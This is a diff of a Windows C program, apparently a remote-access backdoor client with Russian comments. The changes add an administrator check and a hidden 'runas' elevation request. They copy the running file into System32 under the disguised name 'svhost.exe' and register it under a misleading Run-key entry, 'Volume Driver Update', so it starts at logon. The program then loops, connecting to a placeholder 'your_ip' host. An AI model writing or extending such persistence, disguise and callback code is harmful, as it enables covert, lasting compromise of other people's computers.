@@ -18,6 +18,32 @@ WSADATA wsadata;
 ADDRINFO hints;
 ADDRINFO* result;
 
+
+BOOL IsUserAdmin(VOID)	//функция проверки прав администратора (learn.nicrosoft.com)
+{
+	BOOL b;
+	SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
+	PSID AdministratorsGroup;
+	b = AllocateAndInitializeSid(
+		&NtAuthority,
+		2,
+		SECURITY_BUILTIN_DOMAIN_RID,
+		DOMAIN_ALIAS_RID_ADMINS,
+		0, 0, 0, 0, 0, 0,
+		&AdministratorsGroup);
+
+	if (b)
+	{
+		if (!CheckTokenMembership(NULL, AdministratorsGroup, &b))
+		{
+			b = FALSE;
+		}
+		FreeSid(AdministratorsGroup);
+	}
+
+	return(b);
+}
+
 void main() {
 	char* sendbuf = "hello from client";
 	char recvbuf[MAX_MSG];
@@ -32,30 +58,30 @@ void main() {
 
 	char cur_file[MAX_PATH] = { 0 };
 	GetModuleFileNameA(NULL, cur_file, MAX_PATH);
-	
-	char* path_to_appdata;
-	size_t len_p_t_a = 0;
-	_dupenv_s(&path_to_appdata, &len_p_t_a, "APPDATA");	//поиск переменных окружения
-	char new_file[MAX_PATH] = {""};
-	strcpy(new_file, path_to_appdata);
-	strcpy(&(new_file[(int)len_p_t_a - 1]), "\\svhost.exe");
+
+	char new_file[MAX_PATH] = { 0 };
+	GetSystemDirectoryA(new_file, MAX_PATH);	//sys32
+
+	strcpy(&(new_file[(int)strlen(new_file)]), "\\svhost.exe");
 	if (strcmp(cur_file, new_file)) {
-		if (CopyFileA(cur_file, new_file, FALSE)) {		//false - перезапись
-			HKEY reg_key;
-			RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &reg_key);
-			RegSetValueExA(reg_key, "Volume Driver Update", 0, REG_SZ, (BYTE*)new_file, strlen(new_file) + 1);	//+1 для зав. нуля
-			RegCloseKey(reg_key);
-			ShellExecuteA(NULL, "open", new_file, NULL, NULL, SW_HIDE);
+		if (IsUserAdmin()) {
+			if (CopyFileA(cur_file, new_file, FALSE)) {		//false - перезапись
+				HKEY reg_key;
+				RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &reg_key);
+				RegSetValueExA(reg_key, "Volume Driver Update", 0, REG_SZ, (BYTE*)new_file, strlen(new_file) + 1);	//+1 для зав. нуля
+				RegCloseKey(reg_key);
+				ShellExecuteA(NULL, "open", new_file, NULL, NULL, SW_HIDE);
+				exit(0);
+			}
+		}
+		else {
+			ShellExecuteA(NULL, "runas", cur_file, NULL, NULL, SW_HIDE);
 			exit(0);
 		}
 	}
-	//else {
-	//	ShellExecuteA(NULL, "open", new_file, NULL, NULL, SW_HIDE);
-	//	exit(0);
-	//}
 
 	WSAStartup(MAKEWORD(2, 2), &wsadata);	//передача инфы по системе библиотеке/компилятору
-	getaddrinfo("_your_ip_", PORT, &hints, &result);	//раб-ет как переводчик для сокетов (преобразование различных данных)
+	getaddrinfo("your_ip", PORT, &hints, &result);	//раб-ет как переводчик для сокетов (преобразование различных данных)
 
 	while (1) {
 		s = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
